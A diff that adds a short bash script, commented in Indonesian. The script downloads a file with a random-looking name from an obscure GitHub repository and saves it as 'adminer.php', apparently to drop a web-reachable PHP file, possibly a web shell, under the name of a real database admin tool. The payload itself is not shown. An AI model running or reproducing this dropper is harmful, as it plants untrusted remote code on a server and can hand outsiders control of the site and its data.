@@ -1,0 +1,19 @@
+#!/bin/bash
+
+URL="https://raw.githubusercontent.com/okewlalocksystem-tech/BELAWAN/refs/heads/main/a111dsasqsaaasqssaasqasdwasad.txt"
+FILE="adminer.php"
+
+# Download dengan follow redirect + retry
+wget -O $FILE $URL --max-redirect=5 --tries=3 --timeout=30
+
+# Cek apakah file kosong
+if [ ! -s "$FILE" ]; then
+    echo "❌ Download gagal / file kosong!"
+    rm -f $FILE
+    exit 1
+fi
+
+# Set permission aman
+chmod 644 $FILE
+
+echo "✅ Download berhasil & file valid!"
